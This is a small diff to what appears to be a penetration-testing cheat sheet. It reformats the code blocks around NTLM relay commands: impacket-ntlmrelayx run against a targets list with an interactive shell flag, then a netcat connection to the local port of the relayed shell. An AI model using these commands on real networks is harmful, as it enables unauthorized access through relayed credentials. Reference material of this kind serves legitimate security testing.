@@ -387,6 +387,9 @@ impacket-ntlmrelayx -tf targets.txt -smb2support
 Interactive shell:
 ```
 impacket-ntlmrelayx -tf targets.txt -smb2support -i
+```
+
+```
 nc 127.0.0.1 11001
 ```
 
